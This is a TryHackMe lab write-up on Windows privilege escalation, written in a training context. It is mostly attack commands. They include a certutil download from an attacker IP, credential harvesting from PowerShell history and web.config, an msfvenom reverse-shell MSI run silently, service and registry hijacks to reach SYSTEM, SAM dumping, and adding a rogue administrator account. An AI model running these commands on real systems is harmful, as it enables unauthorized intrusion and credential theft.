
# Windows Privilege Escalation — TryHackMe

**By Stager** | FashilHack

---
## What is this room

This room is focused entirely on **Windows Privilege Escalation techniques**.

⚠️ Unlike typical CTFs, **you are already given access** to the system.

The goal is to escalate privileges to higher-level users and eventually **Administrator / SYSTEM** using different techniques.

---

## Initial Access

```bash
User: thm-unpriv
Access: Already provided (RDP / shell)
```

👉 No exploitation required — we start as a low-privileged user.

---

📸 **Screenshot to add here:**

- whoami showing low-priv user
    

---

## Step 1 — Enumeration (WinPEAS)

Transfer WinPEAS:

```bash
certutil -urlcache -f http://<ATTACKER-IP>/winpeas.exe winpeas.exe
```

Run:

```bash
winpeas.exe
```

---

📸 **Screenshot to add here:**

- WinPEAS output (highlighted red sections)
    

---

## Step 2 — Credential Harvesting

### PowerShell History

```bash
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

✔ Found password:

```
ZuperCkretPa5z
```

---

### web.config Credentials

```bash
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

✔ Found:

```
db_admin password
```

---

📸 **Screenshot to add here:**

- Extracted credentials
    

---

## Step 3 — AlwaysInstallElevated

Check registry:

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

If both = `1` → vulnerable

---

### Exploit:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=53 -f msi -o reverse.msi
```

Transfer + execute:

```bash
msiexec /quiet /qn /i reverse.msi
```

---

📸 **Screenshot to add here:**

- SYSTEM shell received
    

---

## Step 4 — Service Exploits

### Weak Service Permissions

Check:

```bash
icacls <service binary>
```

If writable:

✔ Replace with reverse shell  
✔ Restart service

---

### Unquoted Path

Example:

```
C:\Program Files\Unquoted Path Service\Common Files\service.exe
```

Exploit:

- Place `common.exe` in path
    
- Restart service
    

---

### DACL Abuse

```bash
sc config <service> binpath= "reverse.exe"
net start <service>
```

---

📸 **Screenshot to add here:**

- Service exploitation working
    

---

## Step 5 — Registry Exploit

```bash
reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc \
/v ImagePath /t REG_EXPAND_SZ \
/d C:\Users\user\reverse.exe /f
```

Restart service → get SYSTEM

---

## Step 6 — Advanced Privilege Abuse

### SeBackupPrivilege

- Dump SAM & SYSTEM
    
- Extract hashes
    
- Use pass-the-hash
    

---

### Vulnerable Software

Exploit application to:

```bash
net user pwnd Password123 /add
net localgroup administrators pwnd /add
```

---

📸 **Screenshot to add here:**

- Admin access confirmed
    

---

## Key Takeaways

**1. This is NOT a full attack chain room**  
You start with access — focus is escalation only.

---

**2. WinPEAS is essential**  
It quickly highlights privilege escalation paths.

---

**3. Services are the biggest weakness**  
Misconfigurations = easy SYSTEM.

---

**4. Windows privilege escalation has MANY paths**  
There is rarely just one solution.

---


_Stager —  FashilHack — Simulating Attacks, Securing Businesses._